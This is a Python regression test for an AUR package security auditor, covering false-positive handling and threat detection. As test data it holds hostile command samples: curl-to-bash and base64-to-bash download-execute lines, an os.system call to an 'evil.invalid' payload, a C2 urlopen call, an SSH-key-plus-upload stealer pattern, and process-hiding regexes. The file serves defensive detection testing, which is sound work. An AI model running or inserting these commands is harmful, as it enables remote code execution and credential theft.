#!/usr/bin/env python3
from __future__ import annotations

import importlib.machinery
import importlib.util
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "src/aur-security-auditor"
loader = importlib.machinery.SourceFileLoader("asa_fp_148_test", str(APP))
spec = importlib.util.spec_from_loader(loader.name, loader)
module = importlib.util.module_from_spec(spec)
loader.exec_module(module)
module.package_metadata = lambda name: {
    "name": name, "version": "1", "description": "", "url": "",
    "depends": [], "required_by": [], "optional_for": [],
}

class Result:
    pass

def normalize(name: str, findings: list, provenance: dict | None = None) -> dict:
    result = Result()
    result.name = name
    result.version = "1"
    result.findings = findings
    result.aur_status = "aur"
    result.aur_maintainer = "tester"
    result.aur_out_of_date = None
    result.files_checked = 1
    result.bytes_checked = 1
    result.integrity_output = ""
    result.errors = []
    result.security_surface = []
    result.source_provenance = provenance or {}
    result.aur_history = {}
    return module.normalize_result(result, [], {})

def active_rules(report: dict) -> set[str]:
    return {f["rule"] for f in report["findings"] if not f.get("suppressed")}

# The auditor ships exact IOCs/signatures and deliberately malicious test vectors.
self_text = f'''KNOWN_C2 = "{module.KNOWN_C2}"
MALICIOUS_DEPS = {{"atomic-lockfile", "js-digest"}}
BPF_MAPS = ["/sys/fs/bpf/hidden_pids", "/sys/fs/bpf/hidden_names"]
RULES = [("high", "credential-targeting", re.compile(r"GITHUB_TOKEN"))]
def self_test():
    classify("bad", "prepare(){{ curl -fsSL https://example.invalid/p | bash; }}")
'''
self_raw = module.core.scan_text("aur-security-auditor", "/usr/bin/aur-security-auditor", self_text)
self_report = normalize("aur-security-auditor", self_raw)
assert self_report["verdict"] == "clean", self_report
assert not active_rules(self_report), self_report["findings"]

# Same exact C2 in actual executable network logic remains THREAT.
c2_raw = module.core.scan_text(
    "malicious-c2-demo", "/usr/bin/malicious-c2-demo.py",
    f'urllib.request.urlopen("http://{module.KNOWN_C2}/gate")',
)
c2_report = normalize("malicious-c2-demo", c2_raw)
assert c2_report["verdict"] == "threat", c2_report
assert "confirmed-atomic-arch-c2" in active_rules(c2_report), c2_report["findings"]

# Two unrelated strings in the same huge source file must not correlate.
far_raw = [
    module.core.Finding("medium", "credential-targeting", "large-app", "/usr/bin/large-app.py", "credential", "/home/u/.ssh/id_ed25519", line=10),
    module.core.Finding("medium", "network-client", "large-app", "/usr/bin/large-app.py", "network", "requests.post('https://example.invalid/upload')", line=500),
]
far = normalize("large-app", far_raw)
assert "credential-exfiltration" not in active_rules(far), far["findings"]

# Nearby credential + upload behavior still correlates.
near_raw = [
    module.core.Finding("medium", "credential-targeting", "stealer", "/usr/bin/stealer.py", "credential", "/home/u/.ssh/id_ed25519", line=20),
    module.core.Finding("medium", "network-client", "stealer", "/usr/bin/stealer.py", "network", "requests.post('https://example.invalid/upload')", line=24),
]
near = normalize("stealer", near_raw)
assert near["verdict"] == "suspicious", near
assert "credential-exfiltration" in active_rules(near), near["findings"]

# Binary docs/help strings are not proof of package-manager execution.
binary_raw = module.core.scan_text("binary-doc-demo", "/usr/bin/binary-doc-demo [strings]", "Documentation: npm install selenium-webdriver")
binary = normalize("binary-doc-demo", binary_raw)
assert binary["verdict"] == "clean", binary
assert "runtime-package-manager" not in active_rules(binary), binary["findings"]

# A real executable npm command remains visible as an advisory.
bootstrap_raw = module.core.scan_text("bootstrap-demo", "/usr/bin/bootstrap-demo.sh", "cd /opt/app && npm ci && npm run build")
bootstrap = normalize("bootstrap-demo", bootstrap_raw)
assert bootstrap["verdict"] == "clean", bootstrap
assert "runtime-package-manager" in active_rules(bootstrap), bootstrap["findings"]

# Ownership/permission-only drift is not content tampering.
perm_raw = [module.core.Finding(
    "medium", "integrity-warning", "service-app", "pacman -Qkk",
    "Package integrity check reported differences",
    "warning: service-app: /etc/service-app (GID mismatch)\nwarning: service-app: /etc/service-app (Permissions mismatch)",
)]
perm = normalize("service-app", perm_raw)
assert perm["verdict"] == "clean", perm
assert active_rules(perm) == {"metadata-permission-drift"}, perm["findings"]

# Metadata-only drift on executable/auth/system surfaces is still REVIEW.
usrbin_raw = [module.core.Finding(
    "medium", "integrity-warning", "usrbin-drift", "pacman -Qkk",
    "Package integrity check reported differences",
    "warning: usrbin-drift: /usr/bin/helper (Permissions mismatch)",
)]
usrbin = normalize("usrbin-drift", usrbin_raw)
assert usrbin["verdict"] == "review", usrbin
assert "sensitive-metadata-drift" in active_rules(usrbin), usrbin["findings"]

sudoers_raw = [module.core.Finding(
    "medium", "integrity-warning", "sudoers-drift", "pacman -Qkk",
    "Package integrity check reported differences",
    "warning: sudoers-drift: /etc/sudoers.d/example (GID mismatch)",
)]
sudoers = normalize("sudoers-drift", sudoers_raw)
assert sudoers["verdict"] == "review", sudoers
assert "sensitive-metadata-drift" in active_rules(sudoers), sudoers["findings"]

# Real checksum/content mismatch remains REVIEW.
content_raw = [module.core.Finding(
    "medium", "integrity-warning", "tampered-app", "pacman -Qkk",
    "Package integrity check reported differences",
    "warning: tampered-app: /usr/bin/tampered-app (Checksum mismatch)",
)]
content = normalize("tampered-app", content_raw)
assert content["verdict"] == "review", content
assert "integrity-change" in active_rules(content), content["findings"]

# A sandbox filename alone is not enough. It needs actual runtime structure.
fake_sandbox_raw = [module.core.Finding(
    "high", "installed-suid", "fake-browser", "/usr/lib/aur-security-auditor-test-fixture/chrome-sandbox",
    "Installed file has the SUID bit set", "0o4755",
)]
fake_sandbox = normalize("fake-browser", fake_sandbox_raw)
assert fake_sandbox["verdict"] == "review", fake_sandbox
assert "privileged-installed-file" in active_rules(fake_sandbox), fake_sandbox["findings"]

with tempfile.TemporaryDirectory(prefix="asa-browser-sandbox-") as temp:
    runtime = Path(temp) / "usr/lib/electron"
    runtime.mkdir(parents=True)
    helper = runtime / "chrome-sandbox"
    helper.write_bytes(b"\x7fELF" + b"\0" * 32)
    (runtime / "resources.pak").write_bytes(b"x")
    (runtime / "icudtl.dat").write_bytes(b"x")
    sandbox_raw = [module.core.Finding(
        "high", "installed-suid", "electron-demo", str(helper),
        "Installed file has the SUID bit set", "0o4755",
    )]
    assert module._expected_browser_sandbox(
        "/usr/lib/electron/chrome-sandbox", helper
    ), "structural browser sandbox helper was not recognized"
    original_helper = module._expected_browser_sandbox
    module._expected_browser_sandbox = lambda path: original_helper(
        "/usr/lib/electron/chrome-sandbox", helper
    )
    try:
        sandbox = normalize("electron-demo", sandbox_raw)
    finally:
        module._expected_browser_sandbox = original_helper
assert sandbox["verdict"] == "clean", sandbox
assert active_rules(sandbox) == {"expected-sandbox-helper"}, sandbox["findings"]

# Unknown SUID binary is still REVIEW.
unknown_raw = [module.core.Finding(
    "high", "installed-suid", "unknown-suid-demo", "/usr/bin/unknown-helper",
    "Installed file has the SUID bit set", "0o4755",
)]
unknown = normalize("unknown-suid-demo", unknown_raw)
assert unknown["verdict"] == "review", unknown
assert "privileged-installed-file" in active_rules(unknown), unknown["findings"]

# LOW-only supply-chain note stays visible without changing CLEAN verdict.
low_raw = module.core.scan_text("vcs-demo", "/home/u/.cache/yay/vcs-demo/PKGBUILD", "sha256sums=('SKIP')")
low = normalize("vcs-demo", low_raw)
assert low["verdict"] == "clean", low
assert "checksum-skipped" in active_rules(low), low["findings"]

# JavaScript help/error strings that merely tell the user how to run npm are
# not execution. Nearby child_process execution remains detectable.
js_help_raw = module.core.scan_text(
    "tabby-like", "/usr/lib/tabby-like/node_modules/cli/cli.js",
    "cli.fatal('daemon.node not installed. Please run `npm install daemon`');",
)
js_help = normalize("tabby-like", js_help_raw)
assert js_help["verdict"] == "clean", js_help
assert "runtime-package-manager" not in active_rules(js_help), js_help["findings"]

js_exec_raw = module.core.scan_text(
    "js-bootstrap", "/usr/lib/js-bootstrap/bootstrap.js",
    'const child_process = require("child_process"); child_process.exec("npm install daemon");',
)
js_exec = normalize("js-bootstrap", js_exec_raw)
assert js_exec["verdict"] == "clean", js_exec
assert "runtime-package-manager" in active_rules(js_exec), js_exec["findings"]

for label, source in {
    "execSync": 'execSync("npm install daemon");',
    "spawn": 'spawn("npm", ["install", "daemon"]);',
    "execa": 'execa("pnpm", ["add", "daemon"]);',
    "Bun.spawn": 'Bun.spawn(["npm", "install", "daemon"]);',
    "Deno.Command": 'new Deno.Command("npm", {args:["install", "daemon"]});',
}.items():
    js_api_raw = module.core.scan_text(
        f"js-{label}", f"/usr/lib/js-bootstrap/{label}.js", source,
    )
    js_api = normalize(f"js-{label}", js_api_raw)
    assert js_api["verdict"] == "clean", (label, js_api)
    assert "runtime-package-manager" in active_rules(js_api), (label, js_api["findings"])

# HTTP severity is tied to the concrete source entry, not to any checksum
# algorithm that happens to appear elsewhere in the package.
def provenance_from_srcinfo(text: str) -> dict:
    return module.source_document_metadata({".SRCINFO": text})

sha512 = "a" * 128
md5 = "b" * 32

pinned_provenance = provenance_from_srcinfo(
    "source = http://downloads.example.invalid/source.tar.gz\n"
    f"sha512sums = {sha512}\n"
)
http_raw = [module.core.Finding(
    "medium", "aur-insecure-source", "http-pinned", "AUR snapshot:.SRCINFO",
    "Insecure source URL in current AUR metadata",
    "http://downloads.example.invalid/source.tar.gz",
)]
http_pinned = normalize("http-pinned", http_raw, pinned_provenance)
assert http_pinned["verdict"] == "clean", http_pinned
http_finding = next(f for f in http_pinned["findings"] if f["rule"] == "insecure-aur-source")
assert http_finding["severity"] == "low", http_pinned["findings"]

mixed_provenance = provenance_from_srcinfo(
    "source = http://weak.example.invalid/source.tar.gz\n"
    f"md5sums = {md5}\n"
    "source_x86_64 = https://strong.example.invalid/source.tar.gz\n"
    f"sha512sums_x86_64 = {sha512}\n"
)
mixed_raw = [module.core.Finding(
    "medium", "aur-insecure-source", "http-mixed", "AUR snapshot:.SRCINFO",
    "Insecure source URL in current AUR metadata",
    "http://weak.example.invalid/source.tar.gz",
)]
http_mixed = normalize("http-mixed", mixed_raw, mixed_provenance)
assert http_mixed["verdict"] == "review", http_mixed
mixed_finding = next(f for f in http_mixed["findings"] if f["rule"] == "insecure-aur-source")
assert mixed_finding["severity"] == "medium", http_mixed["findings"]

duplicate_url_provenance = provenance_from_srcinfo(
    "source = strong::http://duplicate.example.invalid/source.tar.gz\n"
    "source = weak::http://duplicate.example.invalid/source.tar.gz\n"
    f"sha512sums = {sha512}\n"
    "sha512sums = SKIP\n"
)
duplicate_url_raw = [module.core.Finding(
    "medium", "aur-insecure-source", "http-duplicate", "AUR snapshot:.SRCINFO",
    "Insecure source URL in current AUR metadata",
    "http://duplicate.example.invalid/source.tar.gz",
)]
http_duplicate = normalize("http-duplicate", duplicate_url_raw, duplicate_url_provenance)
assert http_duplicate["verdict"] == "review", http_duplicate
duplicate_item = next(f for f in http_duplicate["findings"] if f["rule"] == "insecure-aur-source")
assert duplicate_item["severity"] == "medium", http_duplicate["findings"]

http_unverified = normalize(
    "http-unverified", http_raw,
    {
        "insecure_sources": ["http://downloads.example.invalid/source.tar.gz"],
        "checksum_algorithms": ["sha512"],
        "skip_count": 0,
        "source_verification": [],
    },
)
assert http_unverified["verdict"] == "review", http_unverified
http_unverified_finding = next(f for f in http_unverified["findings"] if f["rule"] == "insecure-aur-source")
assert http_unverified_finding["severity"] == "medium", http_unverified["findings"]

snapshot_doc_raw = module.core.scan_text(
    "snapshot-doc", "AUR snapshot:snapshot-doc/docs/README.md",
    "Example: curl https://example.invalid/install.sh | bash",
)
snapshot_doc = normalize("snapshot-doc", snapshot_doc_raw)
assert snapshot_doc["verdict"] == "clean", snapshot_doc
assert "download-execute-chain" not in active_rules(snapshot_doc), snapshot_doc["findings"]

snapshot_ioc_raw = module.core.scan_text(
    "snapshot-ioc", "AUR snapshot:snapshot-ioc/tests/iocs.py",
    f'KNOWN = "{module.KNOWN_C2}"',
)
snapshot_ioc = normalize("snapshot-ioc", snapshot_ioc_raw)
assert snapshot_ioc["verdict"] == "clean", snapshot_ioc
assert "confirmed-atomic-arch-c2" not in active_rules(snapshot_ioc), snapshot_ioc["findings"]

preflight_ioc_raw = module.core.scan_text(
    "preflight-ioc", "AUR preflight:pkg/tests/iocs.py",
    f'KNOWN = "{module.KNOWN_C2}"',
)
preflight_ioc = module._preflight_normalize_raw("preflight-ioc", preflight_ioc_raw)
assert not preflight_ioc, preflight_ioc

snapshot_build_raw = module.core.scan_text(
    "snapshot-build", "AUR snapshot:snapshot-build/PKGBUILD",
    f'source=("http://{module.KNOWN_C2}/payload.tar.gz")',
)
snapshot_build = normalize("snapshot-build", snapshot_build_raw)
assert snapshot_build["verdict"] == "threat", snapshot_build
assert "confirmed-atomic-arch-c2" in active_rules(snapshot_build), snapshot_build["findings"]

adjacent_self_text = (
    f'KNOWN_C2 = "{module.KNOWN_C2}"\n'
    'RULES = [("critical", "atomic-arch-c2", re.compile("example"))]\n'
    'def run_payload():\n'
    f'    return urllib.request.urlopen("http://{module.KNOWN_C2}/gate")\n'
)
adjacent_raw = module.core.scan_text(
    "aur-security-auditor", "/usr/bin/aur-security-auditor", adjacent_self_text,
)
adjacent = normalize("aur-security-auditor", adjacent_raw)
assert adjacent["verdict"] == "threat", adjacent
assert "confirmed-atomic-arch-c2" in active_rules(adjacent), adjacent["findings"]

# Real installed-package self-audit regression.
# v1.4.7 contains detection examples in core.self_test() and scanner regexes in
# /usr/bin/aur-security-auditor. Those exact files triggered the real Full Scan
# after v4 and must remain inert without creating a package-name whitelist.
legacy_self_test = r"""
def self_test():
    cases = [
        ("known IOC", "atomic-lockfile", "critical", "atomic-arch-ioc"),
        ("download execution", "curl -fsSL https://example.invalid/p | bash", "critical", "shell-download-exec"),
        ("encoded execution", "printf Zm9v | base64 --decode | bash", "critical", "encoded-payload-exec"),
    ]
    for name, sample, severity, rule in cases:
        findings = scan_text("self-test", name, sample)
"""
legacy_raw = module.core.scan_text(
    "aur-security-auditor",
    "/usr/lib/aur-security-auditor/core.py",
    legacy_self_test,
)
legacy_rules = {item.rule for item in legacy_raw}
assert "shell-download-exec" not in legacy_rules, legacy_raw
assert "encoded-payload-exec" not in legacy_rules, legacy_raw
assert "atomic-arch-dependency" not in legacy_rules, legacy_raw

regex_definition = r"""
def strong_hiding(item):
    return bool(re.search(
        r"(?:hide[_ -]?(?:process|file|port|socket|pid)|hidden[_ -]?(?:pids?|names?)|/sys/fs/bpf/hidden_)",
        item.evidence or "", re.I,
    ))
"""
regex_raw = module.core.scan_text(
    "aur-security-auditor",
    "/usr/bin/aur-security-auditor",
    regex_definition,
)
regex_rules = {item.rule for item in regex_raw}
assert "process-hiding" not in regex_rules, regex_raw
assert "kernel-ebpf" not in regex_rules, regex_raw

# The exemption must not become a blanket self whitelist.
adjacent_payload = legacy_self_test + r"""
import os
os.system("curl -fsSL https://evil.invalid/payload.sh | bash")
"""
adjacent_raw = module.core.scan_text(
    "aur-security-auditor",
    "/usr/lib/aur-security-auditor/core.py",
    adjacent_payload,
)
assert any(item.rule == "shell-download-exec" for item in adjacent_raw), adjacent_raw

# If the currently installed old package is present, scan the exact files that
# Full Scan inventories. LOW advisories are fine. No HIGH/MEDIUM may arise only
# from the auditor's own signatures, regexes or self-test vectors.
for installed_path in (
    Path("/usr/lib/aur-security-auditor/core.py"),
    Path("/usr/bin/aur-security-auditor"),
):
    if installed_path.is_file():
        raw = module.core.scan_text(
            "aur-security-auditor",
            str(installed_path),
            installed_path.read_text(errors="replace"),
        )
        result = module.core.PackageResult(name="aur-security-auditor", version="installed-fixture")
        result.findings = raw
        normalized = module.normalize_result(result, [], {})
        active = [item for item in normalized["findings"] if not item.get("suppressed")]
        serious = [item for item in active if item["severity"] in {"critical", "high", "medium"}]
        assert not serious, (installed_path, serious)

print("1.4.8 false-positive regression test: OK")
print("  ✓ auditor signatures and IOC literals do not self-incriminate")
print("  ✓ real executable C2 context remains a threat")
print("  ✓ behavioral correlations require locality")
print("  ✓ binary documentation is not runtime package-manager behavior")
print("  ✓ permission metadata drift is separated from content tampering")
print("  ✓ sensitive metadata drift remains REVIEW")
print("  ✓ known browser sandbox SUID helper is structurally contextualized")
print("  ✓ sandbox filename alone never bypasses SUID review")
print("  ✓ unknown SUID binaries remain review-worthy")
print("  ✓ LOW-only advisories keep package verdict CLEAN")
print("  ✓ JavaScript npm help strings are not treated as execution")
print("  ✓ real JavaScript child_process npm execution remains visible")
print("  ✓ execSync, spawn, execa, Bun and Deno package-manager execution remains visible")
print("  ✓ HTTP severity is bound to each concrete source checksum")
print("  ✓ repeated HTTP URL occurrences cannot borrow a strong checksum from another occurrence")
print("  ✓ AUR snapshot docs/tests stay inert while PKGBUILD remains actionable")
print("  ✓ self-audit AST scoping does not hide adjacent real payload logic")
print("  ✓ installed 1.4.7 self-test literals stay inert while adjacent payloads remain visible")
